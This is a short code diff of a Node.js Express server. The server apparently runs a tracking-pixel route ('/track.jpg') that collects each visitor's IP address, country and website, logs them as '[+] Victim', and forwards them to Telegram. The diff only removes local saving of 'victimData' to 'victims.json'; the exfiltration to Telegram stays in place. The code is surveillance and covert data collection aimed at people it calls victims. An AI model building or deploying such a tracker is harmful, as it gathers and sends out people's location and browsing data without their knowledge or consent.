@@ -1,7 +1,6 @@
 const express = require('express');
 const WebSocket = require('ws');
 const http = require('http');
-const fs = require('fs');
 const axios = require('axios');
 
 const app = express();
@@ -141,7 +140,6 @@ app.get('/track.jpg', async (req, res) => {
     await sendToTelegram(telegramMsg);
     
     // Сохраняем в файл
-    fs.appendFileSync('victims.json', JSON.stringify(victimData) + '\n');
     
     console.log(`[+] Victim: ${ip} | ${geo.country} | ${website}`);
     
